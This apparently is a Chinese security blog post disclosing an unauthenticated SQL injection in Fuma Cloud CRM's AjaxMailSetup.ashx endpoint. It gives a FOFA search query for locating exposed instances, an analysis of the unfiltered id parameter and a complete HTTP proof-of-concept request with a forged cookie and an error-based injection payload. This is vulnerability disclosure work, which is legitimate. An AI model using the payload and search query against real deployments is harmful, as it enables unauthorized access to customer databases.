---
title: "孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-Dingding-Ajax-AjaxMailSetup-sqli.html
asset_dir: assets/孚盟云crm-ajaxmailsetup.ashx-sql注入漏洞
---

# 孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2026/1/21 08:31
- 230浏览
- [0评论](#comment)
- 6分钟阅读

深入探索

安全运维咨询

Nessus

网络安全课程

---

# 漏洞简介

上海孚盟[软件](#)有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云AjaxMailSetup.ashx接口存在多个[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，未经身份验证的远程攻击者除了可以利用 SQL注入漏洞获取数据库中的信息(例如，管理员后台密码、站点的用户个人信息)之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `AjaxMailSetup.ashx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 **AjaxMailSetup** 方法的实现如下

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-001-f1978879eb06.webp)](https://image.mrxn.net/e0fd116b7afc432d863eab3c94627d04.webp)

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-002-df56b67ac428.webp)](https://image.mrxn.net/f58bf89c542548cb88c9c31a850039cd.webp)

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-003-a58ea3687198.webp)](https://image.mrxn.net/70579988736c429c9afff75e3f9472b8.webp)

当**action=lerevnClick**时，进入`lerevnClick`方法

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-004-c6c055b53bac.webp)](https://image.mrxn.net/e02b36fcc1304af49951b4c6ba5a57e7.webp)

参数**id**通过短下划线分割后第二个元素被直接拼接进SQL语句中执行，期间无过滤或校验，从而造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
POST /m/Dingding/Ajax/AjaxMailSetup.ashx HTTP/1.1
Host: fumacrm.mrxn.net
Cookie: UserCookie={"empId":"1"}
Content-Type: application/x-www-form-urlencoded

action=lerevnClick&id=1_'-1/user--
```

[![孚盟云CRM AjaxMailSetup.ashx SQL注入漏洞](images/img-005-a791a5c843a9.webp)](https://image.mrxn.net/5d969ebb4e5146c4b2385d8a5e097e18.webp)

成功通过报错注入在响应回显数数据库用户信息

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
